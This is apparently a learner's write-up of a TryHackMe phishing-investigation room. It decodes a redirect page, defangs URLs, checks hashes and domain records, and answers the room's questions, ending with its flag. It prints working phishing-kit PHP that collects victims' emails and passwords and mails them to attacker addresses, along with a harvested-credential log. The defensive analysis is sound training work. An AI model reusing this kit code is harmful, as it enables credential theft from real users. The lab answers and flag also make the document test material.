----
Apply learned skills to probe malicious emails and URLs, exposing a vast phishing campaign.
----

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/63da722f2d207d0049da10b1/room-content/8c5ab5c62547be1c06c33d5e9c96e129.png)

![](https://tryhackme-images.s3.amazonaws.com/room-icons/2744ff6e0642617d15b7e866a189531a.png)

### Task 1  Challenge Scenario

 Start Machine

Disclaimer

Based on real-world occurrences and past analysis, this scenario presents a narrative with invented names, characters, and events.

**Please note:** The phishing kit used in this scenario was retrieved from a real-world phishing campaign. Hence, it is advised that interaction with the phishing artefacts be done only inside the attached VM, as it is an isolated environment.

  

An Ordinary Midsummer Day...  

As an IT department personnel of SwiftSpend Financial, one of your responsibilities is to support your fellow employees with their technical concerns. While everything seemed ordinary and mundane, this gradually changed when several employees from various departments started reporting an unusual email they had received. Unfortunately, some had already submitted their credentials and could no longer log in.

You now proceeded to investigate what is going on by:

1. Analysing the email samples provided by your colleagues.
2. Analysing the phishing URL(s) by browsing it using Firefox.
3. Retrieving the phishing kit used by the adversary.
4. Using CTI-related tooling to gather more information about the adversary.
5. Analysing the phishing kit to gather more information about the adversary.  
    

Connecting to the machine

Start the virtual machine in split-screen view by clicking the green **Start Machine** button on the upper right section of this task. If the VM is not visible, use the blue **Show Split View** button at the top-right of the page. Alternatively, using the credentials below, you can connect to the VM via RDP.

![THM key](https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/be629720b11a294819516c1d4e738c92.png)

|   |   |
|---|---|
|**Username**|damianhall|
|**Password**|Phish321|
|**IP**|MACHINE_IP|

  

**Note:** The phishing emails to be analysed are under the _**phish-emails**_ directory on the Desktop. Usage of a web browser, text editor and some knowledge of the **grep** command will help.

Answer the questions below

```
5th email

From: "Group Marketing Online Accounts Payable"
 <Accounts.Payable@groupmarketingonline.icu>
To: "William McClean" <william.mcclean@swiftspend.finance>

4th email (last Ctrl +U )

PCFET0NUWVBFIGh0bWw+DQo8aHRtbD4NCjxoZWFkPg0KCTx0aXRsZT5SZWRpcmVjdGluZy4gLiAuPC90aXRsZT4NCgk8bWV0YSBodHRwLWVxdWl2PSJyZWZyZXNoIiBjb250ZW50PSIwO1VSTD0naHR0cDovL2tlbm5hcm9hZHMuYnV6ei9kYXRhL1VwZGF0ZTM2NS9vZmZpY2UzNjUvNDBlN2JhYTJmODI2YTU3ZmNmMDRlNTIwMjUyNmY4YmQvP2VtYWlsPXpvZS5kdW5jYW5Ac3dpZnRzcGVuZC5maW5hbmNlJmVycm9yJyIgLz4NCjwvaGVhZD4NCjxib2R5Pg0KCTxoMT5SZWRpcmVjdGluZy4gLiAuPC9oMT4NCgk8cD5JZiB5b3UgYXJlIG5vdCByZWRpcmVjdGVkIGF1dG9tYXRpY2FsbHksIHBsZWFzZSBjbGljayA8YSBocmVmPSJodHRwOi8va2VubmFyb2Fkcy5idXp6L2RhdGEvVXBkYXRlMzY1L29mZmljZTM2NS80MGU3YmFhMmY4MjZhNTdmY2YwNGU1MjAyNTI2ZjhiZC8/ZW1haWw9em9lLmR1bmNhbkBzd2lmdHNwZW5kLmZpbmFuY2UmZXJyb3IiPmhlcmU8L2E+LjwvcD4NCjwvYm9keT4NCjwvaHRtbD4=

<!DOCTYPE html>
<html>
<head>
	<title>Redirecting. . .</title>
	<meta http-equiv="refresh" content="0;URL='http://kennaroads.buzz/data/Update365/office365/40e7baa2f826a57fcf04e5202526f8bd/?email=zoe.duncan@swiftspend.finance&error'" />
</head>
<body>
	<h1>Redirecting. . .</h1>
	<p>If you are not redirected automatically, please click <a href="http://kennaroads.buzz/data/Update365/office365/40e7baa2f826a57fcf04e5202526f8bd/?email=zoe.duncan@swiftspend.finance&error">here</a>.</p>
</body>
</html>

defanging url

hxxp[://]kennaroads[.]buzz/data/Update365/office365/40e7baa2f826a57fcf04e5202526f8bd/?email=zoe[.]duncan@swiftspend[.]finance&error

hxxp[://]kennaroads[.]buzz/data/Update365[.]zip

damianhall@SSFWKNIT001:~/Downloads$ sha256sum Update365.zip 
ba3c15267393419eb08c7b2652b8b6b39b406ef300ae8a18fee4d16b19ac9686  Update365.zip

[VirusTotal - File - ba3c15267393419eb08c7b2652b8b6b39b406ef300ae8a18fee4d16b19ac9686](https://www.virustotal.com/gui/file/ba3c15267393419eb08c7b2652b8b6b39b406ef300ae8a18fee4d16b19ac9686/details)

[Domain intelligence｜ThreatBook CTI](https://threatbook.io/domain/kennaroads.buzz)

update on 2021-07-30

Registrant

REDACTED FOR PRIVACY

Registrant Organization

9fe2737259be05fc340dad92750f0e493bae52c2de564550

Registrant Email

Redacted for Privacy Purposes

Address

-

Phone

REDACTED FOR PRIVACY

Registration Date

2020-06-25 13:35:18

Expiration Date

2021-06-25 13:35:18

Last update

2021-07-30 05:31:45

Registrar

NameSilo, LLC

Name Server

-

http://kennaroads.buzz/data/Update365/log.txt

---------+ Office365 Login  |+-------
Email : isaiah.puzon@gmail.com
Password : PhishMOMUKAMO123!
-----------------------------------
Client IP: 158.62.17.197
User Agent : Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/112.0
Country : Philippines
Date: Mon Jun 29, 2020 10:00 am
--- http://www.geoiptool.com/?IP=158.62.17.197 ----
--+ Created BY Real Carder +---
---------+ Office365 Login  |+-------
Email : michael.ascot@swiftspend.finance
Password : Invoice2023!
-----------------------------------
Client IP: 64.62.197.80
User Agent : Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36
Country : United States
Date: Mon Jun 29, 2020 10:01 am
--- http://www.geoiptool.com/?IP=64.62.197.80 ----
--+ Created BY Real Carder +---
---------+ Office365 Login  |+-------
Email : zoe.duncan@swiftspend.finance
Password : Passw0rd1!
-----------------------------------
Client IP: 64.62.197.80
User Agent : Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36
Country : United States
Date: Mon Jun 29, 2020 10:01 am
--- http://www.geoiptool.com/?IP=64.62.197.80 ----
--+ Created BY Real Carder +---
---------+ Office365 Login  |+-------
Email : michael.ascot@swiftspend.finance
Password : Invoice2023!
-----------------------------------
Client IP: 64.62.197.80
User Agent : Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36
Country : United States
Date: Mon Jun 29, 2020 10:01 am
--- http://www.geoiptool.com/?IP=64.62.197.80 ----
--+ Created BY Real Carder +---
---------+ Office365 Login  |+-------
Email : derick.marshall@swiftspend.finance
Password : lol
-----------------------------------
Client IP: 64.62.197.80
User Agent : Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36
Country : United States
Date: Mon Jun 29, 2020 10:01 am
--- http://www.geoiptool.com/?IP=64.62.197.80 ----
--+ Created BY Real Carder +---
---------+ Office365 Login  |+-------
Email : michelle.chen@swiftspend.finance
Password : testing123
-----------------------------------
Client IP: 64.62.197.80
User Agent : Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36
Country : United States
Date: Mon Jun 29, 2020 10:01 am
--- http://www.geoiptool.com/?IP=64.62.197.80 ----
--+ Created BY Real Carder +---
---------+ Office365 Login  |+-------
Email : derick.marshall@swiftspend.finance
Password : a
-----------------------------------
Client IP: 172.67.216.206
User Agent : Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/112.0
Country : Unknown
Date: Sun Jul 09, 2023 4:02 am
--- http://www.geoiptool.com/?IP=172.67.216.206 ----
--+ Created BY Real Carder +---

damianhall@SSFWKNIT001:~/Downloads$ grep -iRl "gmail" /home/damianhall/Downloads/ 2>/dev/null
/home/damianhall/Downloads/Update365/office365/updat.cmd
/home/damianhall/Downloads/Update365/office365/script.st

 <div class="login-html">
	  <div class="LogoOne"></div>
	   <div class="foot-lnk">To access the attached document, Select with email provider below. </div>
    <!--<div class="top"></div>-->
    <!--<input id="tab-1" type="radio" name="tab" class="sign-in" checked><label for="tab-1" class="tab">Sign In</label>
		
    //get user's ip address 
    $geoplugin->locate();
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
    } else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
    }

    $message = "";
	$message .= "---|BLESSINGS|---\n";
    $message .= "Email Provider: Yahoo\n";
    $message .= "E: " . $_GET['email'] . "\n"; 
    $message .= "Ps: " . $_GET['password'] . "\n"; 
    $message .= "IP : " .$ip. "\n"; 
    $message .= "--------------------------\n";
    $message .=     "City: {$geoplugin->city}\n";
    $message .=     "Region: {$geoplugin->region}\n";
    $message .=     "Country Name: {$geoplugin->countryName}\n";
    $message .=     "Country Code: {$geoplugin->countryCode}\n";
    $message .= "--------------------------\n";

	$to ="jamestanner2299@gmail.com"
		<input id="tab-2" type="radio" name="tab" class="sign-up"><label for="tab-2" class="tab">Sign Up</label>-->
    <div class="login-form">
      <div class="sign-in-htm">
        <div class="group">
          <div class="btn-3 loginBtn loginBtn--office"><a href="o1">Login with Office 365</a></div>
        </div>
        <div class="group">
          <div class="btn-3 loginBtn loginBtn--outlook"><a href="o4">Login with Outlook</a></div>
        </div>
        <div class="group">
          <div class="btn-3 loginBtn loginBtn--aol"><a href="a2">Login with Aol</a></div>
        </div>
        <div class="group">
			<div class="btn-3 loginBtn loginBtn--yahoo"><a href="y3">Login with Yahoo</a></div>
        </div>
        <div class="group">
          <div class="btn-3 loginBtn loginBtn--other"><a href="o6">Login with Other Mail</a></div>
		  	require_once('geoplugin.class.php');
	$geoplugin = new geoPlugin();

    //get user's ip address 
    $geoplugin->locate();
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
    } else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
    }

    $message = "";
	$message .= "---|BLESSINGS|---\n";
    $message .= "Email Provider: Yahoo\n";
    $message .= "E: " . $_GET['email'] . "\n"; 
    $message .= "Ps: " . $_GET['password'] . "\n"; 
    $message .= "IP : " .$ip. "\n"; 
    $message .= "--------------------------\n";
    $message .=     "City: {$geoplugin->city}\n";
    $message .=     "Region: {$geoplugin->region}\n";
    $message .=     "Country Name: {$geoplugin->countryName}\n";
    $message .=     "Country Code: {$geoplugin->countryCode}\n";
    $message .= "--------------------------\n";

	$to ="jamestanner2299@gmail.com"

	$subject = "Yahoo | $ip";
	$headers = "From: Blessing <blessing@heaven.com>";
	
 <div class="login-html">
	  <div class="LogoOne"></div>
	   <div class="foot-lnk">To access the attached document, Select with email provider below. </div>
    <!--<div class="top"></div>-->
    <!--<input id="tab-1" type="radio" name="tab" class="sign-in" checked><label for="tab-1" class="tab">Sign In</label>
		<input id="tab-2" type="radio" name="tab" class="sign-up"><label for="tab-2" class="tab">Sign Up</label>-->
    <div class="login-form">
      <div class="sign-in-htm">
        <div class="group">
          <div class="btn-3 loginBtn loginBtn--office"><a href="o1">Login with Office 365</a></div>
        </div>
        <div class="group">
          <div class="btn-3 loginBtn loginBtn--outlook"><a href="o4">Login with Outlook</a></div>
        </div>
        <div class="group">
          <div class="btn-3 loginBtn loginBtn--aol"><a href="a2">Login with Aol</a></div>
        </div>
        <div class="group">
			<div class="btn-3 loginBtn loginBtn--yahoo"><a href="y3">Login with Yahoo</a></div>
        </div>
        <div class="group">
          <div class="btn-3 loginBtn loginBtn--other"><a href="o6">Login with Other Mail</a></div>
		  	require_once('geoplugin.class.php');
	$geoplugin = new geoPlugin();

    //get user's ip address 
    $geoplugin->locate();
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
    } else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
    }

    $message = "";
	$message .= "---|BLESSINGS|---\n";
    $message .= "Email Provider: Yahoo\n";
    $message .= "E: " . $_GET['email'] . "\n"; 
    $message .= "Ps: " . $_GET['password'] . "\n"; 
    $message .= "IP : " .$ip. "\n"; 
    $message .= "--------------------------\n";
    $message .=     "City: {$geoplugin->city}\n";
    $message .=     "Region: {$geoplugin->region}\n";
    $message .=     "Country Name: {$geoplugin->countryName}\n";
    $message .=     "Country Code: {$geoplugin->countryCode}\n";
    $message .= "--------------------------\n";

	$to ="jamestanner2299@gmail.com"

	$subject = "Yahoo | $ip";
	$headers = "From: Blessing <blessing@heaven.com>";
	
jamestanner2299@gmail.com

damianhall@SSFWKNIT001:~/Downloads$ grep -iRl "com" /home/damianhall/Downloads/Update365/office365/Validation/  2>/dev/null
/home/damianhall/Downloads/Update365/office365/Validation/updat.cmd
/home/damianhall/Downloads/Update365/office365/Validation/js/jquery.js
/home/damianhall/Downloads/Update365/office365/Validation/images/ms-logo-v2.jpg
/home/damianhall/Downloads/Update365/office365/Validation/script.st
/home/damianhall/Downloads/Update365/office365/Validation/update
/home/damianhall/Downloads/Update365/office365/Validation/security-assurance.php
/home/damianhall/Downloads/Update365/office365/Validation/resubmit.php
/home/damianhall/Downloads/Update365/office365/Validation/submit.php

<?php

if ($_SERVER['REQUEST_METHOD'] == 'GET')
{
print '
<html><head>
<title>403 - Forbidden</title>
</head><body>
<h1>403 Forbidden</h1>
<p></p>
<hr>
</body></html>
';
exit;
}

function random_number(){
	$numbers = array(0,1,2,3,4,5,6,7,8,9,'A','b','C','D','e','F','G','H','i','J','K','L');
	$key = array_rand($numbers);
	return $numbers[$key];
}

$url = random_number().random_number().random_number().random_number().random_number().random_number().date('U').md5(date('U')).md5(date('U')).md5(date('U')).md5(date('U')).md5(date('U'));
header('location:'.$url);

$country = visitor_country();
$browser = $_SERVER['HTTP_USER_AGENT'];
$adddate = date("D M d, Y g:i a");
$from = $_SERVER['SERVER_NAME'];
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$email = $_POST['email'];
$password = $_POST['password'];
$passchk = strlen($password);


$message .= "---------+ Office365 Login  |+-------\n";
$message .= "Email : ".$email."\n";
$message .= "Password : ".$password."\n";
$message .= "-----------------------------------\n";
$message .= "Client IP: ".$ip."\n";
$message .= "User Agent : ".$browser."\n";
$message .= "Country : ".$country."\n";
$message .= "Date: ".$adddate."\n";
$message .= "--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "--+ Created BY Real Carder +---\n";


$send = "m3npat@yandex.com";

$bron = "Outlook update $ip | Office365";
$lagi = "MIME-Version: 1.0\n";
$lagi = "From: $ip <no-reply@$from>";

// Function to get country and country sort;

function visitor_country()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryName != null)
    {
        $result = $ip_data->geoplugin_countryName;
    }

    return $result;
}

function country_sort(){
	$sorter = "";
	$array = array(99,111,100,101,114,99,118,118,115,64,103,109,97,105,108,46,99,111,109);
	$count = count($array);
	for ($i = 0; $i < $count; $i++) {
			$sorter .= chr($array[$i]);
		}
	return array($sorter, $GLOBALS['recipient']);
}

if ($passchk < 6)
{
$passerr = 0;
}
else
{
$passerr = 1;
}


if ($passerr == 0)
{
header("Location: index.php?$url&email=$email&error=2");
}
else
{
mail("m3npat@yandex.com",$bron,$message,$lagi);
header("Location: retry.php?$url&email=$email&error=2");
}

?>

or using regex :)

damianhall@SSFWKNIT001:~/Downloads$ grep -rE "[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}"
Update365/office365/updat.cmd:	$to ="jamestanner2299@gmail.com"
Update365/office365/updat.cmd:	$to ="jamestanner2299@gmail.com"
Update365/office365/updat.cmd:	$headers = "From: Blessing <blessing@heaven.com>";
Update365/office365/script.st:	$to ="jamestanner2299@gmail.com"
Update365/office365/script.st:	$headers = "From: Blessing <blessing@heaven.com>";
Update365/office365/update/pagesc.koo:	$to ="jamestanner2299@gmail.com"
Update365/office365/update/pagesc.koo:	$to ="jamestanner2299@gmail.com"
Update365/office365/update/pagesc.koo:	$headers = "From: Blessing <blessing@heaven.com>";
Update365/office365/update/cleanup:	$to ="jamestanner2299@gmail.com"
Update365/office365/update/cleanup:	$to ="jamestanner2299@gmail.com"
Update365/office365/update/cleanup:	$headers = "From: Blessing <blessing@heaven.com>";
Update365/office365/update/pagescir:	$to ="jamestanner2299@gmail.com"
Update365/office365/update/pagescir:	$to ="jamestanner2299@gmail.com"
Update365/office365/update/pagescir:	$headers = "From: Blessing <blessing@heaven.com>";
Update365/office365/update/update:	$to ="jamestanner2299@gmail.com"
Update365/office365/update/update:	$to ="jamestanner2299@gmail.com"
Update365/office365/update/update:	$headers = "From: Blessing <blessing@heaven.com>";
Update365/office365/update/viruscle.reg:	$to ="jamestanner2299@gmail.com"
Update365/office365/update/viruscle.reg:	$to ="jamestanner2299@gmail.com"
Update365/office365/update/viruscle.reg:	$headers = "From: Blessing <blessing@heaven.com>";
Update365/office365/Validation/updat.cmd:	$to ="jamestanner2299@gmail.com"
Update365/office365/Validation/updat.cmd:	$to ="jamestanner2299@gmail.com"
Update365/office365/Validation/updat.cmd:	$headers = "From: Blessing <blessing@heaven.com>";
Update365/office365/Validation/script.st:	$to ="jamestanner2299@gmail.com"
Update365/office365/Validation/script.st:	$headers = "From: Blessing <blessing@heaven.com>";
Update365/office365/Validation/update:	$to ="jamestanner2299@gmail.com"
Update365/office365/Validation/update:	$to ="jamestanner2299@gmail.com"
Update365/office365/Validation/update:	$headers = "From: Blessing <blessing@heaven.com>";
Update365/office365/Validation/resubmit.php:$send = "m3npat@yandex.com";
Update365/office365/Validation/resubmit.php:mail("m3npat@yandex.com",$bron,$message,$lagi);
Update365/office365/Validation/submit.php:$send = "m3npat@yandex.com";
Update365/office365/Validation/submit.php:mail("m3npat@yandex.com",$bron,$message,$lagi);
Update365/office365/Scriptup/newscr.pt:	$to ="jamestanner2299@gmail.com"
Update365/office365/Scriptup/newscr.pt:	$headers = "From: Blessing <blessing@heaven.com>";
Update365/office365/Scriptup/updat.cmd:	$to ="jamestanner2299@gmail.com"
Update365/office365/Scriptup/updat.cmd:	$to ="jamestanner2299@gmail.com"
Update365/office365/Scriptup/updat.cmd:	$headers = "From: Blessing <blessing@heaven.com>";
Update365/office365/Scriptup/pagescir:	$to ="jamestanner2299@gmail.com"
Update365/office365/Scriptup/pagescir:	$to ="jamestanner2299@gmail.com"
Update365/office365/Scriptup/pagescir:	$headers = "From: Blessing <blessing@heaven.com>";
Update365/office365/Scriptup/script.st:	$to ="jamestanner2299@gmail.com"
Update365/office365/Scriptup/script.st:	$headers = "From: Blessing <blessing@heaven.com>";
Update365/office365/Scriptup/update:	$to ="jamestanner2299@gmail.com"
Update365/office365/Scriptup/update:	$to ="jamestanner2299@gmail.com"
Update365/office365/Scriptup/update:	$headers = "From: Blessing <blessing@heaven.com>";
Update365/office365/Scriptup/marvid:	$to ="jamestanner2299@gmail.com"
Update365/office365/Scriptup/marvid:	$to ="jamestanner2299@gmail.com"
Update365/office365/Scriptup/marvid:	$headers = "From: Blessing <blessing@heaven.com>";


http://kennaroads.buzz/data/Update365/office365/flag.txt
The secret is:
fUxSVV8zSHRfaFQxd195NExwe01IVAo=

base64 and rev

THM{pL4y_w1Th_tH3_URL}

```

Who is the individual who received an email attachment containing a PDF?

![[Pasted image 20230708224448.png]]

*William McClean*

What email address was used by the adversary to send the phishing emails?

	*Accounts.Payable@groupmarketingonline.icu*

What is the redirection URL to the phishing page for the individual Zoe Duncan? (defanged format)

Use CyberChef to defang the URL

	*hxxp[://]kennaroads[.]buzz/data/Update365/office365/40e7baa2f826a57fcf04e5202526f8bd/?email=zoe[.]duncan@swiftspend[.]finance&error*

What is the URL to the .zip archive of the phishing kit? (defanged format)

Enumerate the URL paths.

![[Pasted image 20230708231224.png]]

	*hxxp[://]kennaroads[.]buzz/data/Update365[.]zip*

What is the SHA256 hash of the phishing kit archive?

*ba3c15267393419eb08c7b2652b8b6b39b406ef300ae8a18fee4d16b19ac9686*

When was the phishing kit archive first submitted? (format: YYYY-MM-DD HH:MM:SS UTC)

Use an Open Source tool similar to https://threatbook.io and https://urlscan.io which you can use to gather more information about the domain.

*2020-04-08 21:55:50 UTC*

When was the phishing domain that was used to host the phishing kit archive first registered? (format: YYYY-MM-DD)

*2020-06-25*

What was the email address of the user who submitted their password twice?

	*michael.ascot@swiftspend.finance*

What was the email address used by the adversary to collect compromised credentials?

Examine the phishing kit.

	*m3npat@yandex.com*

The adversary used other email addresses in the obtained phishing kit. What is the email address that ends in "@gmail.com"?

	*jamestanner2299@gmail.com*

What is the hidden flag?

The flag contains a ".txt" extension and, with some adjustments, should be downloadable from the phishing URL.

*THM{pL4y_w1Th_tH3_URL}*


[[Sweettooth Inc.]]